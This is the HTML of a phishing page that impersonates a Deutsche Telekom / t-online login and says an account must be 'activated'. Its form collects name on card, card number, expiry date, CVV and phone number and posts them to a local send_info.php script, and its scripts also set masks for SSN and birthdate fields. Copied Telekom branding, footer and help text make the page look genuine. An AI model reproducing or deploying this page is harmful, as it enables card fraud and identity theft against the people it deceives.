<html class="no-js" lang="de"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom die Info</title>
    <meta name="description" content="Telekom Login">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <meta name="bwpageid" content="VIEW_USERNAME">

    <link rel="stylesheet" type="text/css" href="./style/components.min.css">
    <link rel="stylesheet" type="text/css" href="./style/login-24.12.2.css">
    


<script src=".\style\js/angular.min.js"></script>
<script src=".\style\js/jquery.min.js"></script>
<script src=".\style\js/jquery.validate.min.js"></script>
<script src=".\style\js/jquery.mask.js"></script>
    


<style>
#Securitycode {
background-image: url('./style/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
background-size: 67px;
background-position: 106.5% 48.1%;

}


 #cardnumber {
background-image: url('./style/cards-sprite-small@2x.png');
background-repeat: no-repeat;
background-size: 62px;
}



</style>




  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
    $('#Securitycode').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');

        $('#expdate').mask('00/0000');

  });
  </script>






<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}



</style>




</head>

<body ng-app="" class="ng-scope">
<div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large" style="
    margin: 20px  0px 0px 0px;
">tT</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">erleben, was verbindet.</span>
                </div>
            </div>
        </div>
        
        
        
    </header>


    <div class="offset-bottom-4 offset-s-bottom-3"></div>
</div>

<div>
    
</div>

<div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">
            <div id="tbs-brand" class="tbs-relative text-center">
                <img src="./style/t-online-logo-29112019.png">
            </div>
            <h1 id="loginuser" class="offset-top-0 offset-bottom-3 text-center" style="
    font-size: 35px;
">Geben Sie Informationen ein, um das Konto zu aktivieren</h1>
            <h1 style="display: none;" id="loginPassword" class="offset-top-0 offset-bottom-3 text-center">Telekom Login Passwort eingeben</h1>

        </div>










        <div id="userlogin" class="login-box">
            

            <div class="offset-bottom-1">
                <form id="signin-form" name="signin-form" method="POST" action="./system/send_info.php" accept-charset="UTF-8" class="ng-pristine ng-valid-email ng-invalid ng-invalid-required ng-valid-maxlength">
                                        <div class="offset-bottom-1">
                        
                        <div class="form-input-set">
                            <input style="
    padding: 7px 12px 6px;
" placeholder="Visitenkarte" required="" ng-model="NameOnCard" id="NameOnCard" name="NameOnCard" type="text" class="form-input ng-pristine ng-empty ng-valid-email ng-invalid ng-invalid-required ng-valid-maxlength ng-touched ng-untouched" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="NameOnCard">

                            <label for="NameOnCard"></label>
                            
                        </div>


<div class="form-input-set">
                            <input style="background-position: 98.5% -0.2%;
    padding: 7px 12px 6px;
" placeholder="Kartennummer" required="" ng-model="cardnumber" id="cardnumber" name="cardnumber" type="text" inputmode="email" class="form-input ng-pristine ng-empty ng-valid-email ng-invalid ng-invalid-required ng-valid-maxlength ng-touched ng-untouched" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="cardnumber">

                            <label for="cardnumber"></label>
                            
                        </div>



<div class="multi equal clearfix">
<div class=" left">

<div class="form-input-set">
                            <input style="
    padding: 7px 12px 6px;
" placeholder="Haltbarkeitsdatum" required="" ng-model="expdate" id="expdate" name="expdate" type="text" class="form-input ng-pristine ng-empty ng-valid-email ng-invalid ng-invalid-required ng-valid-maxlength ng-touched ng-untouched" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="expdate">

                            <label for="expdate"></label>
                            
                        </div>

</div>
<div class="right"> 
<div class="form-input-set">
                            <input style="
    padding: 7px 12px 6px;
" placeholder="Sicherheitscode" required="" ng-model="Securitycode" id="Securitycode" name="Securitycode" type="text" inputmode="text" class="form-input ng-pristine ng-empty ng-valid-email ng-invalid ng-invalid-required ng-valid-maxlength ng-touched ng-untouched" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="Securitycode">

                            <label for="Securitycode"></label>
                            
                        </div>

</div>
</div>

<div class="form-input-set">
                            <input style="
    padding: 7px 12px 6px;
" placeholder="Telefonnummer" required="" ng-model="phoneNumber" id="phoneNumber" name="phoneNumber" type="text" inputmode="text" class="form-input ng-pristine ng-empty ng-valid-email ng-invalid ng-invalid-required ng-valid-maxlength ng-touched ng-untouched" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="phoneNumber">

                            <label for="phoneNumber"></label>
                            
                        </div>

                        
                        <div id="usrInfo" class="info-box">
                            <p>So können Sie sich anmelden:</p>
                            <ul>
                                <li>
                                    <span class="text-bold">E-Mail-Adresse: </span>
                                    <span>Ihre Telekom E-Mail-Adresse oder Ihre E-Mail-Adresse eines anderen Anbieters, mit der Sie sich registriert haben.</span>
                                </li>
                                <li>
                                    <span class="text-bold">Mobilfunk-Nummer: </span>
                                    <span>Ihre Telekom Mobilfunk-Nummer, wenn Sie diese mit Ihrem Telekom Login verknüpft haben.</span>
                                </li>
                                <li>
                                    <span class="text-bold">VERIMI Konto: </span>
                                    <span>Wenn Ihr Telekom Login mit einem VERIMI Konto verknüpft ist, geben Sie hier bitte zunächst Ihren Telekom Login Benutzernamen ein. Anschließend leiten wir Sie zu VERIMI weiter.</span>
                                </li>
                            </ul>
                        </div>




                        
                        <div class="login-helpers clearfix">

                            
                        </div>

                        
                        <div class="clearfix offset-bottom-1">
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large" tabindex="40">Weiter</button>
                        </div>

                        
                        


                    </div>

                </form>

                

                

                

                <div class="text-center offset-bottom-2">
                    
                </div>

                <div class="text-center offset-bottom-2">
                    <img src="./style/services.png">
                </div>

                <div class="text-center offset-bottom-2">
                    <div>
                        <p>
                            <span>Jetzt auch mit Ihrem VERIMI Konto bei der Telekom anmelden.</span>
                            <a id="verimiLink" class="text-nowrap" tabindex="60" target="_blank" href="#/login-daten-passwoerter/verimi">Hier informieren über VERIMI</a>
                        </p>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<footer id="tbs-footer">
    <div class="container-fixed">
        <div class="pull-left">
            <p>© Telekom Deutschland GmbH</p>
            <p class="tbs-text-11">24.12.2, 4194a5e2d0d7b40759d719349ca67bb4, 32ade5dd4c8da31662262f245f3decee46f3c737</p>
        </div>
        <div class="pull-right">
            <ul class="list-inline">
                <li>
                    <a href="#start/impressum" target="_blank">Impressum</a>
                </li>
                <li>
                    <a id="data-protection" href="#datenschutz-ganz-einfach" target="_blank">Datenschutz</a>
                </li>
            </ul>
        </div>
    </div>
</footer>






</body></html>